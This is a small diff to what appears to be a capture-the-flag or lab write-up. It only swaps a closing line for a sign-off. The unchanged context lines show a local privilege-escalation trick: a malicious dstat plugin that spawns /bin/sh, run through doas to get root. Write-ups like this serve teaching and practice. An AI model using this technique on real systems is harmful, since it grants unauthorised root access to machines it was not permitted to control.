@@ -318,9 +318,9 @@ except KeyboardInterrupt:
 	- You can use the same command as above, just change the sudo to doas, and provide the absolute path of the dstat binary. 
 		> echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
 		> doas /usr/bin/dstat --xxx 
-		
-	[+] Root :) 
 ```
+
+_sayonara~🍻_
 
 
 
